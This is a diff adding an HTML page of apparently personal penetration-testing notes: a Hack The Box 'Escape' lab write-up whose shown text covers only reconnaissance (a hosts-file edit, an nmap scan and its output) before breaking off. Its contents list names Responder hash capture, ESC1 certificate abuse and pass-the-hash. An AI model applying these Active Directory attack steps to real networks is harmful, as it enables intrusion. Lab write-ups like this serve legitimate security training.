+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Kerberoasting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Kerberoasting
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../NotAssumedBreach/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    NotAssumedBreach
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../OSCPpath/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    OSCPpath
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../PortForwarding/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    PortForwarding
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../PrivGroupAbuse/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    PrivGroupAbuse
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../RCE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    RCE
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../RecycleBin/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    RecycleBin
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../WebApp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    WebApp
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../WinPEAS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    WinPEAS
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XSS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    XSS
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../certificates/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    certificates
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../certvulntemplate/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    certvulntemplate
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../codereview/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    codereview
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../commandinjection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    commandinjection
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../gpo/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    gpo
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../linux/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    linux
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../history/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    history
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../laps/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    LAPS
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../mssql/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    mssql
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../certvulntoESC1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    certvulntoESC1
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../certvulntoESC9/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    certvulntoESC9
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Impersonation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Impersonation
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Vhosts/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Vhosts
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../certvulntoESC16/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    certvulntoESC16
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../certvulntoESC15/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    certvulntoESC15
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../shadowcredential/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    shadowcredential
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ADdisabledaccount/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    ADdisabledaccount
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#intro" class="md-nav__link">
+    <span class="md-ellipsis">
+      Intro
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#reconnaissance" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reconnaissance
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Reconnaissance">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#add-target-to-etchosts" class="md-nav__link">
+    <span class="md-ellipsis">
+      Add target to /etc/hosts
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#nmap-scan" class="md-nav__link">
+    <span class="md-ellipsis">
+      Nmap scan
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rpc-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      RPC enumeration
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="RPC enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#anonymous-logon" class="md-nav__link">
+    <span class="md-ellipsis">
+      Anonymous logon
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#smb-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      SMB enumeration
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SMB enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#anonymous-logon_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Anonymous logon
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#checking-where-we-can-login-with-the-given-creds" class="md-nav__link">
+    <span class="md-ellipsis">
+      Checking where we can login with the given creds
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ldap-enumeration-as-publicuser" class="md-nav__link">
+    <span class="md-ellipsis">
+      LDAP enumeration as PublicUser
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#smb-enumeration-as-publicuser" class="md-nav__link">
+    <span class="md-ellipsis">
+      SMB enumeration as PublicUser
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mssql-enumeration-as-publicuser" class="md-nav__link">
+    <span class="md-ellipsis">
+      MSSQL enumeration as PublicUser
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#foothold" class="md-nav__link">
+    <span class="md-ellipsis">
+      Foothold
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Foothold">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#directories-and-files-enumeration-as-sql_svc" class="md-nav__link">
+    <span class="md-ellipsis">
+      Directories and Files enumeration as sql_svc
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#checking-where-we-can-login-with-ryans-creds" class="md-nav__link">
+    <span class="md-ellipsis">
+      Checking where we can login with ryan’s creds
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privesc" class="md-nav__link">
+    <span class="md-ellipsis">
+      Privesc
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Privesc">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#find-domain-groups" class="md-nav__link">
+    <span class="md-ellipsis">
+      Find domain groups:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#current-users-group-membership" class="md-nav__link">
+    <span class="md-ellipsis">
+      Current user’s Group membership
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#current-users-privileges" class="md-nav__link">
+    <span class="md-ellipsis">
+      Current user’s privileges:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bloodhound-as-ryan" class="md-nav__link">
+    <span class="md-ellipsis">
+      Bloodhound as ryan
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#enumerate-adcs" class="md-nav__link">
+    <span class="md-ellipsis">
+      Enumerate ADCS
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#abusing-esc1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Abusing ESC1
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Abusing ESC1">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-request-pfx-certificate" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. Request pfx certificate
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-get-tgt-hash-from-the-certificate" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Get TGT hash from the certificate
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#login-as-administrator-via-pass-the-hash" class="md-nav__link">
+    <span class="md-ellipsis">
+      Login as Administrator via pass the hash
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      Summary
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Summary">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#reconnaissance_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reconnaissance
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#foothold_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Foothold
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#privesc_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Privesc
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#flow-chart" class="md-nav__link">
+    <span class="md-ellipsis">
+      Flow chart
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sidenotes" class="md-nav__link">
+    <span class="md-ellipsis">
+      Sidenotes
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h2 id="intro">Intro</h2>
+<p><img alt="image.png" src="../MediaFiles/escape_image.png" /></p>
+<p>[[windows]] [[NotAssumedBreach]] [[mssql]] [[certificates]] [[certvulntoESC1]]</p>
+<p>Tags: #windows #NotAssumedBreach #mssql #certificates #certvulntoESC1</p>
+<p>Tools used:</p>
+<ul>
+<li>rpcclient (RPC enumeration)</li>
+<li>smbclient (SMB enumeration)</li>
+<li>ldapsearch (LDAP enumeration)</li>
+<li>mssqlclient (MSSQL enumeration, impacket)</li>
+<li>Responder (capturing the NTLM hash)</li>
+<li>certipy (ADCS abuse)</li>
+</ul>
+<hr />
+<h1 id="reconnaissance">Reconnaissance</h1>
+<h2 id="add-target-to-etchosts">Add target to /etc/hosts</h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>sudo<span class="w"> </span>sh<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;echo &#39;10.129.228.253 Escape.htb&#39; &gt;&gt; /etc/hosts&quot;</span>
+</span></code></pre></div>
+<h2 id="nmap-scan">Nmap scan</h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>Escape.htb
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.94SVN<span class="w"> </span><span class="o">(</span><span class="w"> </span>&lt;https://nmap.org&gt;<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2025</span>-08-17<span class="w"> </span><span class="m">09</span>:18<span class="w"> </span>CDT
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span>Escape.htb<span class="w"> </span><span class="o">(</span><span class="m">10</span>.129.228.253<span class="o">)</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.0074s<span class="w"> </span>latency<span class="o">)</span>.
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">988</span><span class="w"> </span>filtered<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>no-response<span class="o">)</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>PORT<span class="w">     </span>STATE<span class="w"> </span>SERVICE<span class="w">       </span>VERSION
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="m">53</span>/tcp<span class="w">   </span>open<span class="w">  </span>domain<span class="w">        </span>Simple<span class="w"> </span>DNS<span class="w"> </span>Plus
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="m">88</span>/tcp<span class="w">   </span>open<span class="w">  </span>kerberos-sec<span class="w">  </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Kerberos<span class="w"> </span><span class="o">(</span>server<span class="w"> </span>time:<span class="w"> </span><span class="m">2025</span>-08-17<span class="w"> </span><span class="m">22</span>:18:28Z<span class="o">)</span>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="m">135</span>/tcp<span class="w">  </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="m">139</span>/tcp<span class="w">  </span>open<span class="w">  </span>netbios-ssn<span class="w">   </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>netbios-ssn
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="m">389</span>/tcp<span class="w">  </span>open<span class="w">  </span>ldap<span class="w">          </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>sequel.htb0.,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="p">|</span><span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="p">|</span><span class="w"> </span>Subject<span class="w"> </span>Alternative<span class="w"> </span>Name:<span class="w"> </span>DNS:dc.sequel.htb,<span class="w"> </span>DNS:sequel.htb,<span class="w"> </span>DNS:sequel
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a><span class="p">|</span><span class="w"> </span>Not<span class="w"> </span>valid<span class="w"> </span>before:<span class="w"> </span><span class="m">2024</span>-01-18T23:03:57
+</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a><span class="p">|</span>_Not<span class="w"> </span>valid<span class="w"> </span>after:<span class="w">  </span><span class="m">2074</span>-01-05T23:03:57
+</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a><span class="p">|</span>_ssl-date:<span class="w"> </span><span class="m">2025</span>-08-17T22:19:49+00:00<span class="p">;</span><span class="w"> </span>+8h00m01s<span class="w"> </span>from<span class="w"> </span>scanner<span class="w"> </span>time.
+</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a><span class="m">445</span>/tcp<span class="w">  </span>open<span class="w">  </span>microsoft-ds?
+</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a><span class="m">464</span>/tcp<span class="w">  </span>open<span class="w">  </span>kpasswd5?
+</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a><span class="m">593</span>/tcp<span class="w">  </span>open<span class="w">  </span>ncacn_http<span class="w">    </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC<span class="w"> </span>over<span class="w"> </span>HTTP<span class="w"> </span><span class="m">1</span>.0
+</span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a><span class="m">636</span>/tcp<span class="w">  </span>open<span class="w">  </span>ssl/ldap<span class="w">      </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>sequel.htb0.,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
+</span><span id="__span-2-20"><a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a><span class="p">|</span>_ssl-date:<span class="w"> </span><span class="m">2025</span>-08-17T22:19:48+00:00<span class="p">;</span><span class="w"> </span>+8h00m00s<span class="w"> </span>from<span class="w"> </span>scanner<span class="w"> </span>time.
+</span><span id="__span-2-21"><a id="__codelineno-2-21" name="__codelineno-2-21" href="#__codelineno-2-21"></a><span class="p">|</span><span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:
+</span><span id="__span-2-22"><a id="__codelineno-2-22" name="__codelineno-2-22" href="#__codelineno-2-22"></a><span class="p">|</span><span class="w"> </span>Subject<span class="w"> </span>Alternative<span class="w"> </span>Name:<span class="w"> </span>DNS:dc.sequel.htb,<span class="w"> </span>DNS:sequel.htb,<span class="w"> </span>DNS:sequel
+</span><span id="__span-2-23"><a id="__codelineno-2-23" name="__codelineno-2-23" href="#__codelineno-2-23"></a><span class="p">|</span><span class="w"> </span>Not<span class="w"> </span>valid<span class="w"> </span>before:<span class="w"> </span><span class="m">2024</span>-01-18T23:03:57
+</span><span id="__span-2-24"><a id="__codelineno-2-24" name="__codelineno-2-24" href="#__codelineno-2-24"></a><span class="p">|</span>_Not<span class="w"> </span>valid<span class="w"> </span>after:<span class="w">  </span><span class="m">2074</span>-01-05T23:03:57
+</span><span id="__span-2-25"><a id="__codelineno-2-25" name="__codelineno-2-25" href="#__codelineno-2-25"></a><span class="m">1433</span>/tcp<span class="w"> </span>open<span class="w">  </span>ms-sql-s<span class="w">      </span>Microsoft<span class="w"> </span>SQL<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span><span class="m">15</span>.00.2000.00<span class="p">;</span><span class="w"> </span>RTM
+</span><span id="__span-2-26"><a id="__codelineno-2-26" name="__codelineno-2-26" href="#__codelineno-2-26"></a><span class="p">|</span><span class="w"> </span>ms-sql-ntlm-info:
+</span><span id="__span-2-27"><a id="__codelineno-2-27" name="__codelineno-2-27" href="#__codelineno-2-27"></a><span class="p">|</span><span class="w">   </span><span class="m">10</span>.129.228.253:1433:
+</span><span id="__span-2-28"><a id="__codelineno-2-28" name="__codelineno-2-28" href="#__codelineno-2-28"></a><span class="p">|</span><span class="w">     </span>Target_Name:<span class="w"> </span>sequel
+</span><span id="__span-2-29"><a id="__codelineno-2-29" name="__codelineno-2-29" href="#__codelineno-2-29"></a><span class="p">|</span><span class="w">     </span>NetBIOS_Domain_Name:<span class="w"> </span>sequel
+</span><span id="__span-2-30"><a id="__codelineno-2-30" name="__codelineno-2-30" href="#__codelineno-2-30"></a><span class="p">|</span><span class="w">     </span>NetBIOS_Computer_Name:<span class="w"> </span>DC
+</span><span id="__span-2-31"><a id="__codelineno-2-31" name="__codelineno-2-31" href="#__codelineno-2-31"></a><span class="p">|</span><span class="w">     </span>DNS_Domain_Name:<span class="w"> </span>sequel.htb
+</span><span id="__span-2-32"><a id="__codelineno-2-32" name="__codelineno-2-32" href="#__codelineno-2-32"></a><span class="p">|</span><span class="w">     </span>DNS_Computer_Name:<span class="w"> </span>dc.sequel.htb
+</span><span id="__span-2-33"><a id="__codelineno-2-33" name="__codelineno-2-33" href="#__codelineno-2-33"></a><span class="p">|</span><span class="w">     </span>DNS_Tree_Name:<span class="w"> </span>sequel.htb
+</span><span id="__span-2-34"><a id="__codelineno-2-34" name="__codelineno-2-34" href="#__codelineno-2-34"></a><span class="p">|</span>_<span class="w">    </span>Product_Version:<span class="w"> </span><span class="m">10</span>.0.17763
+</span><span id="__span-2-35"><a id="__codelineno-2-35" name="__codelineno-2-35" href="#__codelineno-2-35"></a><span class="p">|</span><span class="w"> </span>ms-sql-info:
+</span><span id="__span-2-36"><a id="__codelineno-2-36" name="__codelineno-2-36" href="#__codelineno-2-36"></a><span class="p">|</span><span class="w">   </span><span class="m">10</span>.129.228.253:1433:
+</span><span id="__span-2-37"><a id="__codelineno-2-37" name="__codelineno-2-37" href="#__codelineno-2-37"></a><span class="p">|</span><span class="w">     </span>Version:
+</span><span id="__span-2-38"><a id="__codelineno-2-38" name="__codelineno-2-38" href="#__codelineno-2-38"></a><span class="p">|</span><span class="w">       </span>name:<span class="w"> </span>Microsoft<span class="w"> </span>SQL<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>RTM
+</span><span id="__span-2-39"><a id="__codelineno-2-39" name="__codelineno-2-39" href="#__codelineno-2-39"></a><span class="p">|</span><span class="w">       </span>number:<span class="w"> </span><span class="m">15</span>.00.2000.00
+</span><span id="__span-2-40"><a id="__codelineno-2-40" name="__codelineno-2-40" href="#__codelineno-2-40"></a><span class="p">|</span><span class="w">       </span>Product:<span class="w"> </span>Microsoft<span class="w"> </span>SQL<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span>
+</span><span id="__span-2-41"><a id="__codelineno-2-41" name="__codelineno-2-41" href="#__codelineno-2-41"></a><span class="p">|</span><span class="w">       </span>Service<span class="w"> </span>pack<span class="w"> </span>level:<span class="w"> </span>RTM
+</span><span id="__span-2-42"><a id="__codelineno-2-42" name="__codelineno-2-42" href="#__codelineno-2-42"></a><span class="p">|</span><span class="w">       </span>Post-SP<span class="w"> </span>patches<span class="w"> </span>applied:<span class="w"> </span><span class="nb">false</span>
+</span><span id="__span-2-43"><a id="__codelineno-2-43" name="__codelineno-2-43" href="#__codelineno-2-43"></a><span class="p">|</span>_<span class="w">    </span>TCP<span class="w"> </span>port:<span class="w"> </span><span class="m">1433</span>
+</span><span id="__span-2-44"><a id="__codelineno-2-44" name="__codelineno-2-44" href="#__codelineno-2-44"></a><span class="p">|</span>_ssl-date:<span class="w"> </span><span class="m">2025</span>-08-17T22:19:49+00:00<span class="p">;</span><span class="w"> </span>+8h00m01s<span class="w"> </span>from<span class="w"> </span>scanner<span class="w"> </span>time.
+</span><span id="__span-2-45"><a id="__codelineno-2-45" name="__codelineno-2-45" href="#__codelineno-2-45"></a><span class="p">|</span><span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:<span class="w"> </span><span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
+</span><span id="__span-2-46"><a id="__codelineno-2-46" name="__codelineno-2-46" href="#__codelineno-2-46"></a><span class="p">|</span><span class="w"> </span>Not<span class="w"> </span>valid<span class="w"> </span>before:<span class="w"> </span><span class="m">2025</span>-08-17T22:11:38
+</span><span id="__span-2-47"><a id="__codelineno-2-47" name="__codelineno-2-47" href="#__codelineno-2-47"></a><span class="p">|</span>_Not<span class="w"> </span>valid<span class="w"> </span>after:<span class="w">  </span><span class="m">2055</span>-08-17T22:11:38
+</span><span id="__span-2-48"><a id="__codelineno-2-48" name="__codelineno-2-48" href="#__codelineno-2-48"></a><span class="m">3268</span>/tcp<span class="w"> </span>open<span class="w">  </span>ldap<span class="w">          </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>sequel.htb0.,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
+</span><span id="__span-2-49"><a id="__codelineno-2-49" name="__codelineno-2-49" href="#__codelineno-2-49"></a><span class="p">|</span>_ssl-date:<span class="w"> </span><span class="m">2025</span>-08-17T22:19:49+00:00<span class="p">;</span><span class="w"> </span>+8h00m01s<span class="w"> </span>from<span class="w"> </span>scanner<span class="w"> </span>time.
+</span><span id="__span-2-50"><a id="__codelineno-2-50" name="__codelineno-2-50" href="#__codelineno-2-50"></a><span class="p">|</span><span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:
+</span><span id="__span-2-51"><a id="__codelineno-2-51" name="__codelineno-2-51" href="#__codelineno-2-51"></a><span class="p">|</span><span class="w"> </span>Subject<span class="w"> </span>Alternative<span class="w"> </span>Name:<span class="w"> </span>DNS:dc.sequel.htb,<span class="w"> </span>DNS:sequel.htb,<span class="w"> </span>DNS:sequel
+</span><span id="__span-2-52"><a id="__codelineno-2-52" name="__codelineno-2-52" href="#__codelineno-2-52"></a><span class="p">|</span><span class="w"> </span>Not<span class="w"> </span>valid<span class="w"> </span>before:<span class="w"> </span><span class="m">2024</span>-01-18T23:03:57
